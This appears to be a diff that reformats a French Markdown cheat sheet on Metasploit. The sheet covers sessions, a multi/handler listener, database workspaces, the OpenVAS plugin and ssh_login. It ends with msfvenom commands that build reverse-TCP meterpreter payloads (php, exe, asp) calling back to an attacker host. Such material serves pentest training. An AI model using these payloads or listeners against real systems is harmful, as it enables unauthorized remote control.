@@ -2,7 +2,9 @@ metasploit
 ==========
 
 ## Commandes de base
+
 ### Gestion sessions
+
 Pour lister les sessions en cours :
 ```
 msf> sessions -l
@@ -19,6 +21,7 @@ meterpreter> background
 ```
 
 ### Listener
+
 Lancer un listener en attente d'un reverse tcp meterpreter windows :
 ```
 msf> use multi/handler
@@ -29,24 +32,31 @@ msf> exploit -j
 ```
 
 ## Base de données
-On va travailler avec *PostgreSQL* qui est la base de données par défaut dans *metasploit*.
+
+On va travailler avec *PostgreSQL* qui est la base de données par défaut
+dans *metasploit*.
 
 ### La première fois
-Il faut d'abord lancer *PostgreSQL* puis initialiser la base de données pour *metasploit* :
+
+Il faut d'abord lancer *PostgreSQL* puis initialiser la base de données
+pour *metasploit* :
 ```
 # systemctl start postgresql
 # msfdb init
 ```
 
 Cela crée une base de données `msf` et un utilisateur `msf`.
-Au démarrage de `msfconsole`, *metasploit* se connectera automatiquement à cette base de données.
+Au démarrage de `msfconsole`, *metasploit* se connectera automatiquement à
+cette base de données.
 On peut vérifier qu'on est bien connecté :
 ```
 msf> db_status
 ```
 
 ### Workspaces
-On peut ensuite travailler avec des *workspaces* pour ranger ses différents scans.
+
+On peut ensuite travailler avec des *workspaces* pour ranger ses différents
+scans.
 
 Pour lister les *workspaces* disponibles :
 ```
@@ -58,10 +68,12 @@ Pour sélectionner un *workspace* :
 msf> workspace <workspace_name>
 ```
 
-Pour créer un *workspace*, on utilise l'option `-a` et pour supprimer un *workspace* `-d`.
+Pour créer un *workspace*, on utilise l'option `-a` et pour supprimer un
+*workspace* `-d`.
 Plus d'information avec l'option `-h`.
 
 ### Importation de données
+
 Pour importer des données dans la base :
 ```
 msf> db_import <filename_to_import>
@@ -73,6 +85,7 @@ msf> db_nmap <...classical_nmap_options...>
 ```
 
 ### Lire des données
+
 Pour voir les services scannés :
 ```
 msf> services
@@ -94,7 +107,9 @@ msf> vulns
 ```
 
 ## OpenVAS dans Metasploit
-Lancer d'abord une instance `OpenVAS`. Par défaut, l'interface web écoute sur le port 9392 et le scanner sur le port 9390.
+
+Lancer d'abord une instance `OpenVAS`. Par défaut, l'interface web écoute sur
+le port 9392 et le scanner sur le port 9390.
 
 Pour lancer le plugin `OpenVAS` dans `metasploit` :
 ```
@@ -157,7 +172,9 @@ msf> openvas_report_import <report_id> <format_id>
 ```
 
 ## Meterpreter
+
 ### Ouvrir un shell meterpreter à partir d'une connexion ssh
+
 On peut utiliser le module `ssh_login` :
 ```
 msf > use auxiliary/scanner/ssh/ssh_login
@@ -169,23 +186,30 @@ msf auxiliary(ssh_login) > sessions -u 1
 ```
 
 ## Payloads
+
 ### php (meterpreter)
+
 Pour créer un payload *php/meterpreter* en reverse tcp sur le port 4444 :
 ```
 # msfvenom -p php/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f raw > payload.php
 ```
+
 ### windows exe (meterpreter)
+
 ```
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f exe > shell.exe
 ```
+
 ### windows asp (meterpreter)
+
 ```
 # msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f asp > shell.asp
 ```
 
 ## Sources
-* https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf
-* https://www.ehacking.net/2011/11/how-to-use-openvas-in-metasploit.html
-* https://www.offensive-security.com/metasploit-unleashed/using-databases/
-* https://netsec.ws/?p=331
-* https://dotweak.com/fr/2019/08/12/comment-creer-un-payload-metasploit-60545791/
+
+* <https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf>
+* <https://www.ehacking.net/2011/11/how-to-use-openvas-in-metasploit.html>
+* <https://www.offensive-security.com/metasploit-unleashed/using-databases/>
+* <https://netsec.ws/?p=331>
+* <https://dotweak.com/fr/2019/08/12/comment-creer-un-payload-metasploit-60545791/>
